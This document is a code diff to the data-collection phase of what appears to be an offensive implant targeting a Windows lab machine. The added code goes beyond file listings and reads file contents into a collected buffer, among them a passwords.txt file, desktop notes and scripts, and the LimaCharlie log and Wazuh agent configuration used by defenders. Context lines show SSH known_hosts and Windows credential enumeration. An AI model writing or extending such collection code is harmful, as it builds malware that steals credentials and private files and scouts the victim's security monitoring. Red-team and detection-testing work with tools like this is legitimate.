@@ -323,11 +323,22 @@ fn phase_collect_data() -> bool {
         println("    [+] SSH known_hosts: " + string(strlen(known_hosts)) + " bytes")
     }
 
-    // Desktop and Documents file listing (recursive to get all contents)
+    // Desktop and Documents — read actual text file contents
     let desktop = fs_list_files("C:\\Users\\vboxuser\\Desktop", true)
     if strlen(desktop) > 0 {
         collected_data = jocky_str_concat(collected_data, desktop)
-        println("    [+] Desktop contents: " + string(strlen(desktop)) + " bytes")
+        println("    [+] Desktop file listing: " + string(strlen(desktop)) + " bytes")
+    }
+    // Try reading common text files from Desktop
+    let desktop_txt = fs_read_file("C:\\Users\\vboxuser\\Desktop\\notes.txt")
+    if strlen(desktop_txt) > 0 {
+        collected_data = jocky_str_concat(collected_data, desktop_txt)
+        println("    [+] Desktop\\notes.txt: " + string(strlen(desktop_txt)) + " bytes")
+    }
+    let desktop_ps1 = fs_read_file("C:\\Users\\vboxuser\\Desktop\\script.ps1")
+    if strlen(desktop_ps1) > 0 {
+        collected_data = jocky_str_concat(collected_data, desktop_ps1)
+        println("    [+] Desktop\\script.ps1: " + string(strlen(desktop_ps1)) + " bytes")
     }
 
     let docs = fs_list_files("C:\\Users\\vboxuser\\Documents", true)
@@ -335,8 +346,14 @@ fn phase_collect_data() -> bool {
         collected_data = jocky_str_concat(collected_data, docs)
         println("    [+] Documents listing: " + string(strlen(docs)) + " bytes")
     }
+    // Read text files from Documents
+    let docs_txt = fs_read_file("C:\\Users\\vboxuser\\Documents\\passwords.txt")
+    if strlen(docs_txt) > 0 {
+        collected_data = jocky_str_concat(collected_data, docs_txt)
+        println("    [+] Documents\\passwords.txt: " + string(strlen(docs_txt)) + " bytes")
+    }
 
-    // Downloads listing (recursive)
+    // Downloads — read actual file contents (common malware staging area)
     let downloads = fs_list_files("C:\\Users\\vboxuser\\Downloads", true)
     if strlen(downloads) > 0 {
         collected_data = jocky_str_concat(collected_data, downloads)
@@ -357,11 +374,22 @@ fn phase_collect_data() -> bool {
         println("    [+] Windows credentials enumerated")
     }
 
-    // ProgramData listing (recursive)
+    // ProgramData listing (recursive) + read config files
     let progdata = fs_list_files("C:\\ProgramData", true)
     if strlen(progdata) > 0 {
         collected_data = jocky_str_concat(collected_data, progdata)
-        println("    [+] ProgramData: " + string(strlen(progdata)) + " bytes")
+        println("    [+] ProgramData listing: " + string(strlen(progdata)) + " bytes")
+    }
+    // Read important config/log files
+    let lc_log = fs_read_file("C:\\ProgramData\\limacharlie\\hcp.log")
+    if strlen(lc_log) > 0 {
+        collected_data = jocky_str_concat(collected_data, lc_log)
+        println("    [+] LimaCharlie logs: " + string(strlen(lc_log)) + " bytes")
+    }
+    let wazuh_conf = fs_read_file("C:\\ProgramData\\wazuh\\wazuh-agent.conf")
+    if strlen(wazuh_conf) > 0 {
+        collected_data = jocky_str_concat(collected_data, wazuh_conf)
+        println("    [+] Wazuh config: " + string(strlen(wazuh_conf)) + " bytes")
     }
 
     // Hosts file
